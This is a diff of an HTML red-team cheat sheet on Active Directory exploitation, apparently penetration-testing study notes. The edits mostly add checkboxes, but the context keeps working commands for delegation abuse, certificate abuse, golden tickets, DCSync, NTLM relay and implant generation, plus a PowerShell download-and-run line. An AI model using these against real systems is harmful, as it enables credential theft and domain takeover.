-    <li>Find principals trusted for delegation to specific SPNs:
+    <li><input type="checkbox"> Find principals trusted for delegation to specific SPNs:
       <ul>
-        <li><code>Get-DomainUser -TrustedToAuth</code></li>
-        <li>BloodHound delegation map</li>
+        <li><input type="checkbox"> <code>Get-DomainUser -TrustedToAuth</code></li>
+        <li><input type="checkbox"> BloodHound delegation map</li>
       </ul>
     </li>
-    <li>S4U2self + S4U2proxy chain:
+    <li><input type="checkbox"> S4U2self + S4U2proxy chain:
       <ul>
-        <li><code>Rubeus.exe s4u /user:svc /rc4:[hash] /impersonateuser:Administrator /msdsspn:cifs/[target]</code></li>
-        <li>Then PTT and access the target SPN</li>
+        <li><input type="checkbox"> <code>Rubeus.exe s4u /user:svc /rc4:[hash] /impersonateuser:Administrator /msdsspn:cifs/[target]</code></li>
+        <li><input type="checkbox"> Then PTT and access the target SPN</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-ad-exploitation-rbcd">1.8.4 Resource-Based Constrained Delegation</h3>
   <ul>
-    <li>Full RBCD chain (3 steps):</li>
+    <li><input type="checkbox"> Full RBCD chain (3 steps):</li>
   </ul>
 <pre><code class="language-bash"># Step 1: Add a fake computer (requires MAQ &gt; 0)
 impacket-addcomputer -computer-name FAKE$ -computer-pass Pass1! \
@@ -1551,35 +1553,35 @@ impacket-psexec -k -no-pass [target]</code></pre>
 
 <h3 id="methodology-ad-exploitation-shadow-creds">1.8.5 Shadow Credentials</h3>
   <ul>
-    <li>Write msDS-KeyCredentialLink on the target:
+    <li><input type="checkbox"> Write msDS-KeyCredentialLink on the target:
       <ul>
-        <li><code>certipy shadow auto -u user@[dom] -p pass -account [target]</code></li>
+        <li><input type="checkbox"> <code>certipy shadow auto -u user@[dom] -p pass -account [target]</code></li>
       </ul>
     </li>
-    <li>Authenticate via PKINIT and recover the NT hash</li>
+    <li><input type="checkbox"> Authenticate via PKINIT and recover the NT hash</li>
   </ul>
 
 <h3 id="methodology-ad-exploitation-adcs">1.8.6 AD Certificate Services (ESC1&ndash;ESC16)</h3>
   <ul>
-    <li>Map the ADCS posture:
+    <li><input type="checkbox"> Map the ADCS posture:
       <ul>
-        <li><code>certipy find -u user@[dom] -p pass -dc-ip [dc] -enabled -stdout</code></li>
-        <li><code>certipy find -u user@[dom] -p pass -dc-ip [dc] -vulnerable</code></li>
+        <li><input type="checkbox"> <code>certipy find -u user@[dom] -p pass -dc-ip [dc] -enabled -stdout</code></li>
+        <li><input type="checkbox"> <code>certipy find -u user@[dom] -p pass -dc-ip [dc] -vulnerable</code></li>
       </ul>
     </li>
-    <li>Pick the right ESC primitive:
+    <li><input type="checkbox"> Pick the right ESC primitive:
       <ul>
-        <li>ESC1: SubjectAltName on a User template &mdash; request as any user</li>
-        <li>ESC4: writable template ACL &mdash; flip to ESC1, then exploit</li>
-        <li>ESC6: <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> on the CA</li>
-        <li>ESC7: Manage Certificates ACL on the CA</li>
-        <li>ESC8: HTTP enrolment + NTLM relay</li>
-        <li>ESC9 / ESC10: weak certificate mapping</li>
-        <li>ESC11: ICPR over RPC</li>
-        <li>ESC13: OID issuance policy abuse</li>
+        <li><input type="checkbox"> ESC1: SubjectAltName on a User template &mdash; request as any user</li>
+        <li><input type="checkbox"> ESC4: writable template ACL &mdash; flip to ESC1, then exploit</li>
+        <li><input type="checkbox"> ESC6: <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> on the CA</li>
+        <li><input type="checkbox"> ESC7: Manage Certificates ACL on the CA</li>
+        <li><input type="checkbox"> ESC8: HTTP enrolment + NTLM relay</li>
+        <li><input type="checkbox"> ESC9 / ESC10: weak certificate mapping</li>
+        <li><input type="checkbox"> ESC11: ICPR over RPC</li>
+        <li><input type="checkbox"> ESC13: OID issuance policy abuse</li>
       </ul>
     </li>
-    <li>Exploit and PTT:</li>
+    <li><input type="checkbox"> Exploit and PTT:</li>
   </ul>
 <pre><code class="language-bash"># Request certificate as Administrator (ESC1)
 certipy req -u [user]@[domain] -p [pass] -ca [CA-Name] \
@@ -1595,46 +1597,46 @@ impacket-psexec -hashes :[nt-hash] [domain]/Administrator@[dc]</code></pre>
 
 <h3 id="methodology-ad-exploitation-acl-abuse">1.8.7 ACL Abuse</h3>
   <ul>
-    <li>Generic-Write &rarr; targeted Kerberoast:
+    <li><input type="checkbox"> Generic-Write &rarr; targeted Kerberoast:
       <ul>
-        <li>Set an SPN on a victim user, kerberoast, crack</li>
+        <li><input type="checkbox"> Set an SPN on a victim user, kerberoast, crack</li>
       </ul>
     </li>
-    <li>Generic-Write &rarr; Shadow Credentials</li>
-    <li>WriteDACL &rarr; grant yourself DCSync:
+    <li><input type="checkbox"> Generic-Write &rarr; Shadow Credentials</li>
+    <li><input type="checkbox"> WriteDACL &rarr; grant yourself DCSync:
       <ul>
-        <li>Add <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code></li>
+        <li><input type="checkbox"> Add <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code></li>
       </ul>
     </li>
-    <li>AddMember chains via nested groups</li>
+    <li><input type="checkbox"> AddMember chains via nested groups</li>
   </ul>
 
 <h3 id="methodology-ad-exploitation-ticket-forgery">1.8.8 Ticket Forgery</h3>
   <ul>
-    <li>Golden ticket from the krbtgt hash:
+    <li><input type="checkbox"> Golden ticket from the krbtgt hash:
       <ul>
-        <li><code>ticketer.py -nthash [krbtgt-nt] -domain-sid [sid] -domain [dom] -spn krbtgt/[dom] Administrator</code></li>
-        <li><code>export KRB5CCNAME=Administrator.ccache</code> then DCSync as proof</li>
+        <li><input type="checkbox"> <code>ticketer.py -nthash [krbtgt-nt] -domain-sid [sid] -domain [dom] -spn krbtgt/[dom] Administrator</code></li>
+        <li><input type="checkbox"> <code>export KRB5CCNAME=Administrator.ccache</code> then DCSync as proof</li>
       </ul>
     </li>
-    <li>Silver ticket for a single service:
+    <li><input type="checkbox"> Silver ticket for a single service:
       <ul>
-        <li>Forge a TGS with the service account&rsquo;s hash &mdash; no AS-REQ trail</li>
+        <li><input type="checkbox"> Forge a TGS with the service account&rsquo;s hash &mdash; no AS-REQ trail</li>
       </ul>
     </li>
-    <li>Diamond / Sapphire tickets when source-of-truth fields matter</li>
+    <li><input type="checkbox"> Diamond / Sapphire tickets when source-of-truth fields matter</li>
   </ul>
 
 <h3 id="methodology-ad-exploitation-dcsync">1.8.9 DCSync</h3>
   <ul>
-    <li>Confirm the principal has the right ACL:
+    <li><input type="checkbox"> Confirm the principal has the right ACL:
       <ul>
-        <li><code>DS-Replication-Get-Changes</code></li>
-        <li><code>DS-Replication-Get-Changes-All</code></li>
-        <li><code>DS-Replication-Get-Changes-In-Filtered-Set</code></li>
+        <li><input type="checkbox"> <code>DS-Replication-Get-Changes</code></li>
+        <li><input type="checkbox"> <code>DS-Replication-Get-Changes-All</code></li>
+        <li><input type="checkbox"> <code>DS-Replication-Get-Changes-In-Filtered-Set</code></li>
       </ul>
     </li>
-    <li>Run from the foothold:</li>
+    <li><input type="checkbox"> Run from the foothold:</li>
   </ul>
 <pre><code class="language-bash"># From Linux
 impacket-secretsdump [domain]/[user]:[pass]@[dc] -just-dc
@@ -1647,27 +1649,27 @@ mimikatz # lsadump::dcsync /user:[domain]\Administrator</code></pre>
 
 <h3 id="methodology-ad-exploitation-ntlm-relay">1.8.10 NTLM Relay Attacks</h3>
   <ul>
-    <li>Set up the relay listener:
+    <li><input type="checkbox"> Set up the relay listener:
       <ul>
-        <li><code>ntlmrelayx.py -tf targets.txt -smb2support -socks</code></li>
-        <li>Optional: <code>--escalate-user</code> to make the relayed user a domain admin via LDAP</li>
+        <li><input type="checkbox"> <code>ntlmrelayx.py -tf targets.txt -smb2support -socks</code></li>
+        <li><input type="checkbox"> Optional: <code>--escalate-user</code> to make the relayed user a domain admin via LDAP</li>
       </ul>
     </li>
-    <li>Coerce the source of the NTLM:
+    <li><input type="checkbox"> Coerce the source of the NTLM:
       <ul>
-        <li>Coercer (multi-protocol)</li>
-        <li>PetitPotam (EFSRPC)</li>
-        <li>PrinterBug (RPC printer)</li>
-        <li>DFSCoerce (DFSNM)</li>
-        <li>AuthCoerce on MSSQL via <code>xp_dirtree</code></li>
+        <li><input type="checkbox"> Coercer (multi-protocol)</li>
+        <li><input type="checkbox"> PetitPotam (EFSRPC)</li>
+        <li><input type="checkbox"> PrinterBug (RPC printer)</li>
+        <li><input type="checkbox"> DFSCoerce (DFSNM)</li>
+        <li><input type="checkbox"> AuthCoerce on MSSQL via <code>xp_dirtree</code></li>
       </ul>
     </li>
-    <li>Choose the relay target by capability:
+    <li><input type="checkbox"> Choose the relay target by capability:
       <ul>
-        <li>LDAP to add SPN / set RBCD / grant DCSync</li>
-        <li>LDAPS to write password</li>
-        <li>AD CS HTTP for cert issuance</li>
-        <li>SMB on hosts without signing for SOCKS access</li>
+        <li><input type="checkbox"> LDAP to add SPN / set RBCD / grant DCSync</li>
+        <li><input type="checkbox"> LDAPS to write password</li>
+        <li><input type="checkbox"> AD CS HTTP for cert issuance</li>
+        <li><input type="checkbox"> SMB on hosts without signing for SOCKS access</li>
       </ul>
     </li>
   </ul>
@@ -1675,16 +1677,16 @@ mimikatz # lsadump::dcsync /user:[domain]\Administrator</code></pre>
 
 <h3 id="methodology-ad-exploitation-trusts">1.8.11 Domain &amp; Forest Trusts</h3>
   <ul>
-    <li>Enumerate trusts and their direction:
+    <li><input type="checkbox"> Enumerate trusts and their direction:
       <ul>
-        <li><code>Get-DomainTrust</code></li>
-        <li><code>nltest /domain_trusts /all_trusts</code></li>
+        <li><input type="checkbox"> <code>Get-DomainTrust</code></li>
+        <li><input type="checkbox"> <code>nltest /domain_trusts /all_trusts</code></li>
       </ul>
     </li>
-    <li>Cross-trust ticket forgery:
+    <li><input type="checkbox"> Cross-trust ticket forgery:
       <ul>
-        <li>Inter-realm key extraction &mdash; forge a referral ticket</li>
-        <li>Cross-forest delegation abuses for two-way forest trusts</li>
+        <li><input type="checkbox"> Inter-realm key extraction &mdash; forge a referral ticket</li>
+        <li><input type="checkbox"> Cross-forest delegation abuses for two-way forest trusts</li>
       </ul>
     </li>
   </ul>
@@ -1760,10 +1762,10 @@ mimikatz # lsadump::dcsync /user:[domain]\Administrator</code></pre>
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://blog.harmj0y.net/" target="_blank" rel="noopener noreferrer">harmj0y blog</a> &middot; <a href="https://dirkjanm.io/" target="_blank" rel="noopener noreferrer">dirk-jan blog</a> &middot; <a href="https://posts.specterops.io/" target="_blank" rel="noopener noreferrer">SpecterOps blog</a></p>
 
 <h3 id="methodology-utilities">1.9 Utilities</h3>
-<ul><li>Operator one-liners, encoders, evasion helpers, C2 clients pulled out of larger sections for fast access.</li></ul>
+<ul><li><input type="checkbox"> Operator one-liners, encoders, evasion helpers, C2 clients pulled out of larger sections for fast access.</li></ul>
 <h3 id="methodology-utilities-encoders">1.9.1 Encoders</h3>
   <ul>
-    <li>Encode for the right ingestion path:</li>
+    <li><input type="checkbox"> Encode for the right ingestion path:</li>
   </ul>
 <pre><code class="language-bash"># PowerShell base64 (UTF-16LE for -enc flag)
 echo -en 'IEX(New-Object Net.WebClient).DownloadString("http://[ip]/a.ps1")' \
@@ -1779,34 +1781,34 @@ python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" 'pa
 
 <h3 id="methodology-utilities-c2-clients">1.9.2 C2 Clients</h3>
   <ul>
-    <li>Sliver for cross-platform implants:
+    <li><input type="checkbox"> Sliver for cross-platform implants:
       <ul>
-        <li><code>sliver-server</code> for team server</li>
-        <li>Generate: <code>generate --mtls [you]:443 --save .</code></li>
+        <li><input type="checkbox"> <code>sliver-server</code> for team server</li>
+        <li><input type="checkbox"> Generate: <code>generate --mtls [you]:443 --save .</code></li>
       </ul>
     </li>
-    <li>Mythic for multi-agent ops</li>
-    <li>Sliver when the engagement licences it</li>
+    <li><input type="checkbox"> Mythic for multi-agent ops</li>
+    <li><input type="checkbox"> Sliver when the engagement licences it</li>
   </ul>
 <p><strong>References:</strong> <a href="https://sliver.sh/" target="_blank" rel="noopener noreferrer">Sliver C2 wiki</a> &middot; <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Sliver user guide</a></p>
 
 <h3 id="methodology-utilities-impacket">1.9.3 Impacket Suite</h3>
   <ul>
-    <li>Daily-driver tools:
+    <li><input type="checkbox"> Daily-driver tools:
       <ul>
-        <li><code>secretsdump.py</code>, <code>psexec.py</code>, <code>smbexec.py</code>, <code>wmiexec.py</code></li>
-        <li><code>ntlmrelayx.py</code>, <code>getST.py</code>, <code>addcomputer.py</code></li>
-        <li><code>rpcdump.py</code>, <code>samrdump.py</code></li>
+        <li><input type="checkbox"> <code>secretsdump.py</code>, <code>psexec.py</code>, <code>smbexec.py</code>, <code>wmiexec.py</code></li>
+        <li><input type="checkbox"> <code>ntlmrelayx.py</code>, <code>getST.py</code>, <code>addcomputer.py</code></li>
+        <li><input type="checkbox"> <code>rpcdump.py</code>, <code>samrdump.py</code></li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-utilities-bloodyad">1.9.4 BloodyAD</h3>
   <ul>
-    <li>When you need to write LDAP attributes from Linux:
+    <li><input type="checkbox"> When you need to write LDAP attributes from Linux:
       <ul>
-        <li><code>bloodyAD -d [dom] -u user -p pass --host [dc] add user newUser ...</code></li>
-        <li><code>bloodyAD -d [dom] -u user -p pass --host [dc] set object [target] msDS-AllowedToActOnBehalfOfOtherIdentity ...</code></li>
+        <li><input type="checkbox"> <code>bloodyAD -d [dom] -u user -p pass --host [dc] add user newUser ...</code></li>
+        <li><input type="checkbox"> <code>bloodyAD -d [dom] -u user -p pass --host [dc] set object [target] msDS-AllowedToActOnBehalfOfOtherIdentity ...</code></li>
       </ul>
     </li>
   </ul>
@@ -5756,7 +5758,7 @@ sudo iodine -f -P [password] [dns-server-ip] [tunnel-domain]
   </tbody>
 </table>
 
-<h2 id="windows">5. Windows Post Exploitation</h2>
+<h2 id="windows">5. Windows Post-Exploitation</h2>
 <h3 id="privilege-escalation">5.1 Privilege Escalation</h3>
 
 <h3 id="privilege-escalation-enumeration">5.1.1 Enumeration</h3>
@@ -7664,7 +7666,7 @@ schtasks /run /s [host] /tn [task]
 scshell.py -hashes :[hash] [domain]/[user]@[ip] SensorService
 </code></pre>
 
-<h2 id="linux">6. Linux Post Exploitation</h2>
+<h2 id="linux">6. Linux Post-Exploitation</h2>
 
 <h3 id="linux-initial-access">6.1 Initial Access</h3>
 
@@ -8698,7 +8700,7 @@ exec sp_serveroption '[linked_server]', 'rpc out', 'true';
 
 <pre><code class="language-powershell">Get-SQLQuery -Instance "[host]\[instance]" -Query "execute as login='sa'; exec sp_serveroption '[linked_server]', 'rpc out', 'true'"
 </code></pre>
-<h2 id="ad-enumeration">8. Active Directory Enumeration</h2>
+<h2 id="ad-enumeration">8. AD Enumeration</h2>
 
 <h3 id="ad-enum-bloodhound-sharphound">8.1 BloodHound &amp; SharpHound</h3>
 <ul><li>BloodHound visualises AD relationships and attack paths. SharpHound collects the raw data.</li></ul>
@@ -9498,7 +9500,7 @@ ORDER BY ADMIN_COUNT DESC</code></pre>
 WHERE n.name = $result AND NOT c=n
 RETURN p</code></pre>
 
-<h2 id="ad-attacking">9. Active Directory Exploitation</h2>
+<h2 id="ad-attacking">9. AD Exploitation</h2>
 
 <h3 id="ad-attack-unconstrained-delegation">9.1 Unconstrained Delegation</h3>
 <ul><li>Unconstrained delegation lets a service impersonate any authenticating user by caching their TGT. Steal a cached ticket or force authentication to capture one.</li></ul>
@@ -11885,6 +11887,18 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
 </code></pre>
 
 
+
+<h2 id="references">11. References</h2>
+<ul>
+<li><a href="https://www.offsec.com/courses/pen-300/" target="_blank" rel="noopener noreferrer">OffSec PEN-300 (OSEP)</a></li>
+<li><a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a></li>
+<li><a href="https://www.thehacker.recipes/" target="_blank" rel="noopener noreferrer">The Hacker Recipes</a></li>
+<li><a href="https://wadcoms.github.io/" target="_blank" rel="noopener noreferrer">WADComs</a></li>
+<li><a href="https://www.ired.team/" target="_blank" rel="noopener noreferrer">ired.team (Red Team Notes)</a></li>
+<li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a></li>
+<li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a></li>
+</ul>
+
             </div>
           </div>
         </div>
@@ -11914,94 +11928,94 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-reconnaissance-external-scan">1.1.1 External Scanning</a>
-          <a href="#methodology-reconnaissance-internal-scan">1.1.2 Internal Scanning From the Foothold</a>
+        <a href="#methodology-reconnaissance-external-scan">1.1.1 External Scanning</a>
+        <a href="#methodology-reconnaissance-internal-scan">1.1.2 Internal Scanning From the Foothold</a>
         </div>
         <button class="dropdown-btn">1.2 Initial Access
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-initial-access-phishing">1.2.1 Phishing</a>
-          <a href="#methodology-initial-access-payloads">1.2.2 Payloads</a>
-          <a href="#methodology-loader-skeleton">1.2.3 Shellcode Loader Skeleton (C#)</a>
-          <a href="#methodology-initial-access-shell-upgrade">1.2.4 Upgrading Shells</a>
-          <a href="#methodology-initial-access-process-injection">1.2.5 Process Injection & Migration</a>
+        <a href="#methodology-initial-access-phishing">1.2.1 Phishing</a>
+        <a href="#methodology-initial-access-payloads">1.2.2 Payloads</a>
+        <a href="#methodology-loader-skeleton">1.2.3 Shellcode Loader Skeleton (C#)</a>
+        <a href="#methodology-initial-access-shell-upgrade">1.2.4 Upgrading Shells</a>
+        <a href="#methodology-initial-access-process-injection">1.2.5 Process Injection & Migration</a>
         </div>
         <button class="dropdown-btn">1.3 Tunneling
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-tunneling-ligolo">1.3.1 Ligolo-ng</a>
-          <a href="#methodology-tunneling-sshuttle">1.3.2 sshuttle</a>
-          <a href="#methodology-tunneling-metasploit-pivot">1.3.3 Metasploit Pivoting</a>
-          <a href="#methodology-tunneling-domain-fronting">1.3.4 Domain Fronting</a>
-          <a href="#methodology-tunneling-dns-tunneling">1.3.5 DNS Tunneling</a>
+        <a href="#methodology-tunneling-ligolo">1.3.1 Ligolo-ng</a>
+        <a href="#methodology-tunneling-sshuttle">1.3.2 sshuttle</a>
+        <a href="#methodology-tunneling-metasploit-pivot">1.3.3 Metasploit Pivoting</a>
+        <a href="#methodology-tunneling-domain-fronting">1.3.4 Domain Fronting</a>
+        <a href="#methodology-tunneling-dns-tunneling">1.3.5 DNS Tunneling</a>
         </div>
         <button class="dropdown-btn">1.4 Windows Post Exploitation
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-windows-postex-sit-aware">1.4.1 Situational Awareness</a>
-          <a href="#methodology-windows-postex-privesc">1.4.2 Privilege Escalation</a>
-          <a href="#methodology-windows-postex-defense-evasion">1.4.3 Defense Evasion</a>
-          <a href="#methodology-windows-postex-credential-access">1.4.4 Credential Access</a>
+        <a href="#methodology-windows-postex-sit-aware">1.4.1 Situational Awareness</a>
+        <a href="#methodology-windows-postex-privesc">1.4.2 Privilege Escalation</a>
+        <a href="#methodology-windows-postex-defense-evasion">1.4.3 Defense Evasion</a>
+        <a href="#methodology-windows-postex-credential-access">1.4.4 Credential Access</a>
         </div>
         <button class="dropdown-btn">1.5 Linux Post Exploitation
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-linux-postex-triage">1.5.1 Host Triage</a>
-          <a href="#methodology-linux-postex-privesc">1.5.2 Privilege Escalation</a>
-          <a href="#methodology-linux-postex-lateral">1.5.3 Lateral Movement</a>
-          <a href="#methodology-linux-postex-shared-lib">1.5.4 Shared Library Hijacking</a>
-          <a href="#methodology-linux-postex-defense-evasion">1.5.5 Defense Evasion</a>
+        <a href="#methodology-linux-postex-triage">1.5.1 Host Triage</a>
+        <a href="#methodology-linux-postex-privesc">1.5.2 Privilege Escalation</a>
+        <a href="#methodology-linux-postex-lateral">1.5.3 Lateral Movement</a>
+        <a href="#methodology-linux-postex-shared-lib">1.5.4 Shared Library Hijacking</a>
+        <a href="#methodology-linux-postex-defense-evasion">1.5.5 Defense Evasion</a>
         </div>
         <button class="dropdown-btn">1.6 MSSQL
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-mssql-auth">1.6.1 Authentication</a>
-          <a href="#methodology-mssql-enumeration">1.6.2 Enumeration</a>
-          <a href="#methodology-mssql-code-exec">1.6.3 Code Execution Primitives</a>
-          <a href="#methodology-mssql-linked-server">1.6.4 Linked Server Pivot</a>
-          <a href="#methodology-mssql-relay">1.6.5 NTLM Relay Attacks</a>
-          <a href="#methodology-mssql-privesc">1.6.6 Privilege Escalation</a>
+        <a href="#methodology-mssql-auth">1.6.1 Authentication</a>
+        <a href="#methodology-mssql-enumeration">1.6.2 Enumeration</a>
+        <a href="#methodology-mssql-code-exec">1.6.3 Code Execution Primitives</a>
+        <a href="#methodology-mssql-linked-server">1.6.4 Linked Server Pivot</a>
+        <a href="#methodology-mssql-relay">1.6.5 NTLM Relay Attacks</a>
+        <a href="#methodology-mssql-privesc">1.6.6 Privilege Escalation</a>
         </div>
         <button class="dropdown-btn">1.7 Active Directory Enumeration
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-ad-enumeration-bloodhound">1.7.1 BloodHound & SharpHound</a>
-          <a href="#methodology-ad-enumeration-ldap">1.7.2 Direct LDAP Queries</a>
-          <a href="#methodology-ad-enumeration-powerview">1.7.3 PowerView</a>
-          <a href="#methodology-ad-enumeration-acl-enum">1.7.4 ACL Enumeration</a>
-          <a href="#methodology-ad-enumeration-netexec">1.7.5 NetExec / CrackMapExec Sweeps</a>
-          <a href="#methodology-ad-enumeration-bloodhound-cypher">1.7.6 Cypher Queries</a>
+        <a href="#methodology-ad-enumeration-bloodhound">1.7.1 BloodHound & SharpHound</a>
+        <a href="#methodology-ad-enumeration-ldap">1.7.2 Direct LDAP Queries</a>
+        <a href="#methodology-ad-enumeration-powerview">1.7.3 PowerView</a>
+        <a href="#methodology-ad-enumeration-acl-enum">1.7.4 ACL Enumeration</a>
+        <a href="#methodology-ad-enumeration-netexec">1.7.5 NetExec / CrackMapExec Sweeps</a>
+        <a href="#methodology-ad-enumeration-bloodhound-cypher">1.7.6 Cypher Queries</a>
         </div>
         <button class="dropdown-btn">1.8 Active Directory Exploitation
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-ad-exploitation-kerberoast-asrep">1.8.1 Kerberoasting & AS-REP Roasting</a>
-          <a href="#methodology-ad-exploitation-unconstrained">1.8.2 Unconstrained Delegation</a>
-          <a href="#methodology-ad-exploitation-constrained">1.8.3 Constrained Delegation</a>
-          <a href="#methodology-ad-exploitation-rbcd">1.8.4 Resource-Based Constrained Delegation</a>
-          <a href="#methodology-ad-exploitation-shadow-creds">1.8.5 Shadow Credentials</a>
-          <a href="#methodology-ad-exploitation-adcs">1.8.6 AD Certificate Services (ESC1–ESC16)</a>
-          <a href="#methodology-ad-exploitation-acl-abuse">1.8.7 ACL Abuse</a>
-          <a href="#methodology-ad-exploitation-ticket-forgery">1.8.8 Ticket Forgery</a>
-          <a href="#methodology-ad-exploitation-dcsync">1.8.9 DCSync</a>
-          <a href="#methodology-ad-exploitation-ntlm-relay">1.8.10 NTLM Relay Attacks</a>
-          <a href="#methodology-ad-exploitation-trusts">1.8.11 Domain & Forest Trusts</a>
+        <a href="#methodology-ad-exploitation-kerberoast-asrep">1.8.1 Kerberoasting & AS-REP Roasting</a>
+        <a href="#methodology-ad-exploitation-unconstrained">1.8.2 Unconstrained Delegation</a>
+        <a href="#methodology-ad-exploitation-constrained">1.8.3 Constrained Delegation</a>
+        <a href="#methodology-ad-exploitation-rbcd">1.8.4 Resource-Based Constrained Delegation</a>
+        <a href="#methodology-ad-exploitation-shadow-creds">1.8.5 Shadow Credentials</a>
+        <a href="#methodology-ad-exploitation-adcs">1.8.6 AD Certificate Services (ESC1&ndash;ESC16)</a>
+        <a href="#methodology-ad-exploitation-acl-abuse">1.8.7 ACL Abuse</a>
+        <a href="#methodology-ad-exploitation-ticket-forgery">1.8.8 Ticket Forgery</a>
+        <a href="#methodology-ad-exploitation-dcsync">1.8.9 DCSync</a>
+        <a href="#methodology-ad-exploitation-ntlm-relay">1.8.10 NTLM Relay Attacks</a>
+        <a href="#methodology-ad-exploitation-trusts">1.8.11 Domain & Forest Trusts</a>
         </div>
         <button class="dropdown-btn">1.9 Utilities
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#methodology-utilities-encoders">1.9.1 Encoders</a>
-          <a href="#methodology-utilities-c2-clients">1.9.2 C2 Clients</a>
-          <a href="#methodology-utilities-impacket">1.9.3 Impacket Suite</a>
-          <a href="#methodology-utilities-bloodyad">1.9.4 BloodyAD</a>
+        <a href="#methodology-utilities-encoders">1.9.1 Encoders</a>
+        <a href="#methodology-utilities-c2-clients">1.9.2 C2 Clients</a>
+        <a href="#methodology-utilities-impacket">1.9.3 Impacket Suite</a>
+        <a href="#methodology-utilities-bloodyad">1.9.4 BloodyAD</a>
         </div>
       </div>
     </div>
@@ -12024,22 +12038,30 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#initial-further-access-phishing-send-emails-commands">3.1.1 Send Emails Commands</a>
-          <a href="#initial-further-access-phishing-microsoft-word">3.1.2 Microsoft Word</a>
-          <a href="#initial-further-access-phishing-microsoft-word-callback-pinging">3.1.3 Callback Pinging</a>
-          <a href="#initial-further-access-phishing-microsoft-word-determine-target-architecture">3.1.4 Determine Target Architecture</a>
-          <a href="#initial-further-access-phishing-microsoft-word-shellcode-runner-meterpreter-encrypted">3.1.5 Shellcode Runner - Meterpreter Encrypted</a>
-          <a href="#initial-further-access-phishing-microsoft-word-shellcode-runner-cs-vba-encrypted">3.1.6 Shellcode Runner - C# VBA Encrypted</a>
-          <a href="#initial-further-access-phishing-microsoft-word-powershell-stager-encrypted-obfuscated">3.1.7 PowerShell Stager - Encrypted & Obfuscated</a>
-          <a href="#initial-further-access-phishing-microsoft-word-powershell-stager-unencrypted">3.1.8 PowerShell Stager - Unencrypted</a>
-          <a href="#initial-further-access-phishing-microsoft-word-process-injection-meterpreter-encrypted">3.1.9 Process Injection - Meterpreter Encrypted</a>
-          <a href="#initial-further-access-phishing-microsoft-word-process-hollow-meterpreter-encrypted">3.1.10 Process Hollow - Meterpreter Encrypted</a>
-          <a href="#initial-further-access-jscript">3.1.11 JScript</a>
-          <a href="#initial-further-access-hta">3.1.12 HTA</a>
+        </div>
+        <button class="dropdown-btn">3.1.1 Send Emails Commands
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+        </div>
+        <button class="dropdown-btn">3.1.2 Microsoft Word
+          <i class="bi bi-caret-down-fill"></i>
+        </button>
+        <div class="nested-dropdown-container">
+        <a href="#initial-further-access-phishing-microsoft-word-callback-pinging">3.1.3 Callback Pinging</a>
+        <a href="#initial-further-access-phishing-microsoft-word-determine-target-architecture">3.1.4 Determine Target Architecture</a>
+        <a href="#initial-further-access-phishing-microsoft-word-shellcode-runner-meterpreter-encrypted">3.1.5 Shellcode Runner - Meterpreter Encrypted</a>
+        <a href="#initial-further-access-phishing-microsoft-word-shellcode-runner-cs-vba-encrypted">3.1.6 Shellcode Runner - C# VBA Encrypted</a>
+        <a href="#initial-further-access-phishing-microsoft-word-powershell-stager-encrypted-obfuscated">3.1.7 PowerShell Stager - Encrypted & Obfuscated</a>
+        <a href="#initial-further-access-phishing-microsoft-word-powershell-stager-unencrypted">3.1.8 PowerShell Stager - Unencrypted</a>
+        <a href="#initial-further-access-phishing-microsoft-word-process-injection-meterpreter-encrypted">3.1.9 Process Injection - Meterpreter Encrypted</a>
+        <a href="#initial-further-access-phishing-microsoft-word-process-hollow-meterpreter-encrypted">3.1.10 Process Hollow - Meterpreter Encrypted</a>
+        <a href="#initial-further-access-jscript">3.1.11 JScript</a>
         </div>
         <a href="#initial-further-access-jscript-simple-meterpreter-dropper">2.1.11.1 Simple Meterpreter Dropper</a>
         <a href="#initial-further-access-jscript-dotnettojscript">2.1.11.2 Meterpreter Loader with DotNetToJScript</a>
         <a href="#initial-further-access-jscript-supersharpshooter">2.1.11.3 Meterpreter with SuperSharpShooter</a>
+        <a href="#initial-further-access-hta">3.1.12 HTA</a>
         <a href="#initial-further-access-hta-clm-bypass-ps-script">2.1.12.1 C# for CLM Bypass with PS Script</a>
         <a href="#initial-further-access-hta-clm-bypass-dotnettojscript">2.1.12.2 C# for CLM Bypass with DotNetToJScript</a>
         <a href="#initial-further-access-hta-supersharpshooter">2.1.12.3 JScript from SuperSharpShooter</a>
